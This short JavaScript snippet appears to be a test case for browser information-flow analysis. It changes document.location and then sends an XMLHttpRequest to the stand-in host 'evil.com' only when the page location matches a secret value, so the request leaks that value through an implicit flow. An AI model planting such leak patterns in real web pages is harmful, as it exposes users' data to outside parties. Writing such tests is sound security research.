var TopString = (45).toString(12);
document.location.href = TopString;

var x = new XMLHttpRequest();
x.open("GET", "http://evil.com");

try {
	if (document.location.href != "hush-hush.com")
		throw "irrelevant";
	x.send(null);	
} catch (_) {};
